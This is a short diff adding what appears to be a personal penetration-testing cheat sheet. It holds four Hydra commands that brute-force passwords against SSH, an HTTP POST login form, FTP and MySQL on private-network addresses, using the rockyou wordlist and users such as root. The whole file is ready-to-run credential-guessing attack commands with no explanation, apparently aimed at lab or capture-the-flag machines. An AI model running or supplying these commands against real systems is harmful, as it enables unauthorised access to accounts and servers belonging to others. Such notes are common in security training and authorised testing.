@@ -1,0 +1,12 @@
+
+# SSH
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.103 ssh -V
+
+# HTTP-POST
+hydra -l "" -P dict.txt 192.168.0.107 http-post-form "/kZmBswc/index.php:key=^PASS^:invalid key"
+
+# FTP
+hydra -l ragnar -P secret_invert 192.168.0.102 ftp -V 
+
+# MYSQL
+ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 mysql://192.168.105.118 -V
